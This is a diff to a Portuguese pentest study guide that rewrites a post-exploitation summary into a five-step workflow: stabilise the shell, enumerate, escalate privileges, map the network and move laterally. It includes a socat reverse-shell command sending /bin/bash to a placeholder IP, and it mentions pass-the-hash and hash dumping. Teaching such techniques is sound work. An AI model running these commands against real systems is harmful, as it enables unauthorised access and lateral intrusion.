@@ -56,13 +56,53 @@ smbserver.py share /tmp/pasta_compartilhada -smb2
 # \\192.168.1.1\share\arquivo.exe
 ```
 
-### Resumo da ordem:
+### Resumo da ordem — Por que essa sequência?
+
+Pós-exploração segue: **manter acesso → enumerar → movimentar**.
+
 ```
-1. smbclient.py   → ver pastas compartilhadas
-2. wmiexec.py      → executar comandos remotamente
-3. secretsdump.py  → pegar hashes de senhas
-4. psexec.py -hashes → usar hashes em outras máquinas
-5. smbserver.py    → transferir arquivos
+PASSO 1: Estabilizar shell → Garantir acesso persistente
+├── POR QUE: Shells interrompidas são comuns, precisa de algo mais estável
+├── O QUE FAZER: Usar socat para shell com SSL, ou meterpreter
+├── COMANDO: socat OPENSSL:IP:4444,verify=0 EXEC:/bin/bash
+├── QUANDO AVANÇAR: Quando tiver shell estável
+└── DICAS: Teste com Ctrl+C se a shell trava
+
+        ↓
+
+PASSO 2: Enumerar sistema → Descobrir o que tem na máquina
+├── POR QUE: Precisa saber: versão do SO, usuários, serviços, configurações
+├── O QUE PROCURAR: Versão do kernel (vulnerável?), usuários com sudo, arquivos sensíveis
+├── COMANDO: LinPEAS no Linux, WinPEAS no Windows
+├── QUANDO AVANÇAR: Quando tiver mapa completo do sistema
+└── ERROS COMUNS: Não pule a enumeração — ela revela caminhos de escalação
+
+        ↓
+
+PASSO 3: Escalação de privilégios → Ganhar root/admin
+├── POR QUE: Root = acesso total ao sistema
+├── O QUE PROCURAR: SUID binaries, kernels vulneráveis, sudo sem senha
+├── FERRAMENTAS: LinPEAS, GTFOBins, linux-exploit-suggester
+├── QUANDO AVANÇAR: Quando tiver root
+└── SE DER ERRADO: Se não achar caminho, verifique /etc/crontab, /opt/, backups
+
+        ↓
+
+PASSO 4: Enumerar rede → Descobrir outras máquinas
+├── POR QUE: Uma máquina comprometida pode dar acesso a outras
+├── O QUE PROCURAR: Outros IPs na rede, serviços internos, trust relationships
+├── COMANDO: ip a, arp -a, nmap -sn 10.0.0.0/24
+├── QUANDO AVANÇAR: Quando souber quais máquinas existem na rede
+└── DICAS: Verifique /etc/hosts, /etc/resolv.conf, rotas
+
+        ↓
+
+PASSO 5: Movimentação lateral → Acessar outras máquinas
+├── POR QUE: O alvo final pode estar em outra máquina
+├── O QUE FAZER: Usar credenciais encontradas, pivoting, pass-the-hash
+├── FERRAMENTAS: Impacket (smbexec, wmiexec), Evil-WinRM
+├── QUANDO PARAR: Quando alcançar o alvo final
+└── ÉTICA: Documente cada passo para o relatório
 ```
 
 ---
